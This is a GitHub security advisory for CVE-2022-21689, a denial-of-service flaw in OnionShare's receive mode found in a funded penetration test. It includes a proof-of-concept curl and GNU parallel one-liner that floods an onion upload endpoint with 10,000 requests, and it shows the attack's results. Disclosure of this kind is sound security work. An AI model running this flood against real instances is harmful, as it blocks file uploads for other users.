# [H] Denial of Service in Onionshare

## Summary
Severity: High
Advisory: GHSA-jh82-c5jw-pxpc
CVE: CVE-2022-21689
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-01-21
Source: https://github.com/advisories/GHSA-jh82-c5jw-pxpc
Type: github-advisory

## Affected
- PyPI: `onionshare-cli` — affected >=0 <2.5

## Details
Between September 26, 2021 and October 8, 2021, [Radically Open Security](https://www.radicallyopensecurity.com/) conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's [Red Team lab](https://www.opentech.fund/labs/red-team-lab/).

- Vulnerability ID: OTF-012
- Vulnerability type: Denial of Service
- Threat level: Moderate

## Description:

The receive mode limits concurrent uploads to 100 per second and blocks other uploads in the same second, which can be triggered by a simple script.

## Technical description:

The following script uses GNU parallel and curl with around 6000 requests in parallel to send 10000 requests. A change in the `ulimit -n` configuration is required for it to work. This is sufficient to block file upload on a (public) receive instance.

```
seq 10000 | parallel --max-args 0 --jobs 6000 "curl -i -s -x socks5h://localhost:9150 -k -X $'POST' -H $'Host: csqrp3qciewvj5axph4o62jnr6aevhmpxfkydmi3256bprhbusr2ltid.onion' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------19182376703918074873375387042' -H $'Content-Length: 329' -H $'Connection: close' --data-binary $'-----------------------------19182376703918074873375387042\x0d\x0aContent-Disposition: form-data; name=\"file[]\"; filename=\"poc.txt\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0aA\x0d\x0a-----------------------------19182376703918074873375387042\x0d\x0aContent-Disposition: form-data; name=\"text\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------19182376703918074873375387042--\x0d\x0a' $'http://csqrp3qciewvj5axph4o62jnr6aevhmpxfkydmi3256bprhbusr2ltid.onion/upload-ajax'"
```

Attack duration was around 80 seconds.

Cases where over 99 requests were sent per second:

```
Every 0.1s: ls | grep...   onionvm: Tue Oct 5 12:17:00 2021
78
```

Cases where files were successfully written to disk:

```
Every 0.1s: ls | wc -w   onionvm: Tue Oct 5 12:17:00 2021
8399
```

This means that during the attack time 1601 requests of 10000 were dropped. We tried to upload multiple files in the web interface during the attack and were not successful.

The failsafe is used to prevent creating more than 100 directories per second:

https://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/receive_mode.py#L386-L427

The limit of 100 requests/second is significantly lower than the possible network bandwidth and greatly reduces the attack complexity for denial of service. Our test was conducted over the tor network, which showed no limitation for the required bandwidth.

## Impact:

An adversary with access to the receive mode can block file upload for others. There is no way to block this attack in public mode due to the anonymity properties of the tor network.

## Recommendation:

- Remove this limitation, or
- Derive directory name from milliseconds

## References
- https://github.com/onionshare/onionshare/security/advisories/GHSA-jh82-c5jw-pxpc
- https://nvd.nist.gov/vuln/detail/CVE-2022-21689
- https://github.com/onionshare/onionshare
- https://github.com/onionshare/onionshare/releases/tag/v2.5
- https://github.com/pypa/advisory-database/tree/main/vulns/onionshare-cli/PYSEC-2022-40.yaml
